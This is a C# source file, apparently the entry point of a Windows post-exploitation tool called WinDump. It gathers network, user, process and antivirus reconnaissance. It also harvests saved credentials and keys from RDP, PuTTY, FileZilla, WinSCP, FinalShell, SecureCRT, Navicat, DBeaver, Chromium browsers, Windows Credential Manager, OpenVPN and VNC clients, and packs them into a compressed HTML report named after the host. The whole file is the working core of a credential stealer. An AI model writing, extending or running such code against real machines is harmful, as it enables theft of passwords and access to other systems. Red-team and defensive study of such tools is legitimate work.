using System;
using System.Collections.Generic;
using System.IO;
using System.IO.Compression;
using System.Net;
using System.Text;

namespace WinDump
{
    internal class Program
    {
        static void Main(string[] args)
        {
            var title = Interface.GetIP() + "_" + Environment.MachineName;
            var navicat = Navicat.GetNavicat(out var navicatkey);
            Dictionary<string, string> values = new Dictionary<string, string>
            {
                {"{title}",  title},
                // Network
                {"{interface}", Utils.ToHTML(Interface.GetInterface())},
                {"{route}", Utils.ToHTML(Routing.GetRoute())},
                {"{tcp}", Utils.ToHTML(Netstat.GetTCP())},
                {"{udp}", Utils.ToHTML(Netstat.GetUDP())},
                {"{dns}", Utils.ToHTML(DNSCache.GetDNSCache())},
                {"{wifi}", Utils.ToHTML(WIFI.GetWIFI())},

                // User
                {"{user}", Utils.ToHTML(User.GetUser())},
                {"{quser}", Utils.ToHTML(QUser.GetQUser())},

                // Process
                {"{process}", Utils.ToHTML(Process.GetProcess())},
                {"{service}", Utils.ToHTML(Process.GetService())},
                {"{av}", Utils.ToHTML(Process.GetAV())},

                // Files
                {"{hosts}", Files.Hosts()},
                {"{iis}", Files.IIS()},
                {"{powershell}", Files.Powershell()},

                // Directories
                {"{programs}", Utils.ToHTML(Directories.Programs())},
                {"{recent}", Utils.ToHTML(Directories.Recent())},
                {"{explorer}", Utils.ToHTML(Directories.ExplorerHistory())},
                {"{desktop}", Utils.ToHTML(Directories.Desktop())},
                {"{documents}", Utils.ToHTML(Directories.Documents())},
                {"{ssh}", Utils.ToHTML(Directories.SSH())},

                // Cred
                {"{rdp}", Utils.ToHTML(RDP.GetRDP())},
                {"{putty}", Utils.ToHTML(Putty.GetPutty())},
                {"{filezilla}", Utils.ToHTML(FileZilla.GetFileZilla())},
                {"{xmanager_session}", Utils.ToHTML(XManager.GetSession())},
                {"{xmanager_key}", Utils.ToHTML(XManager.GetUserKey())},
                {"{winscp}", Utils.ToHTML(WinSCP.GetWinSCP())},
                {"{finalshell}", Utils.ToHTML(FinalShell.GetFinalShell())},
                {"{finalshellkey}", Utils.ToHTML(FinalShell.GetFinalShellKey())},
                {"{securecrt}", Utils.ToHTML(SecureCRT.GetSecureCRT())},
                {"{navicat}", Utils.ToHTML(navicat)},
                {"{navicatkey}", Utils.ToHTML(navicatkey)},
                {"{dbeaver}", DBeaver.GetDBeaver()},
                {"{browser}", Utils.ToHTML(BrowserChromiumBased.GetChromiumBased())},
                {"{credential}", Utils.ToHTML(Credential.GetCred())},
                {"{openvpn}", Utils.ToHTML(OpenVPN.GetOpenVPN())},
                {"{tightvnc}", Utils.ToHTML(TightVNC.GetTightVNC())},
                {"{ultravnc}", Utils.ToHTML(UltraVNC.GetUltraVNC())},

                // System
                {"{systeminfo}",  Utils.ToHTML(SystemInfo.GetInfo())},
                {"{drive}", Utils.ToHTML(SystemInfo.GetDrive())},
                {"{product}", Utils.ToHTML(SystemInfo.GetInstalledApp())},
            };
            var output = new MemoryStream();
            using (var ms = new MemoryStream(Resource.index))
            using(var gz = new GZipStream(ms,CompressionMode.Decompress))
            {
                byte[] buffer = new byte[4096];
                int bytesRead;
                while ((bytesRead = gz.Read(buffer, 0, buffer.Length)) > 0)
                {
                    output.Write(buffer, 0, bytesRead);
                }
            }
            var sb = new StringBuilder(Encoding.UTF8.GetString(output.ToArray()));
            foreach (KeyValuePair<string, string> item in values)
            {
                sb.Replace(item.Key, item.Value);
            }
            var data = Encoding.UTF8.GetBytes(sb.ToString());
            var filename = Path.Combine(AppDomain.CurrentDomain.BaseDirectory, title + ".html.gz");
            using (var fs = new FileStream(filename, FileMode.Create, FileAccess.Write, FileShare.None))
            using(var gz = new GZipStream(fs,CompressionMode.Compress))
            {
                gz.Write(data,0,data.Length);
            }
            Environment.Exit(0);

        }


    }
}
